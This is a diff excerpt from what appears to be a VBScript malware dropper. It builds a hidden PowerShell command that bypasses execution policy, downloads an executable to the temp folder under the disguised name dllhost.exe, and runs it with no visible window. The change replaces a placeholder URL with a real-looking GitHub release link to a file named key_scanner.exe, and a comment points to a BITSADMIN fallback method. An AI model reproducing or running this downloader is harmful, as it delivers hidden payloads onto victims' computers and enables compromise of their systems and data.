@@ -21,7 +21,7 @@
   
   ' ==== METHOD 1: MOST RELIABLE (POWERSHELL) ====
   psCommand = "powershell -NoP -NonI -W Hidden -Exec Bypass ""$p='%temp%\dllhost.exe';" & _
-              "(New-Object Net.WebClient).DownloadFile('https://example.com/payload.exe',$p);" & _
+              "(New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe',$p);" & _
               "Start-Process -WindowStyle Hidden $p"""
   
   ' ==== METHOD 2: ALTERNATIVE (BITSADMIN) ====
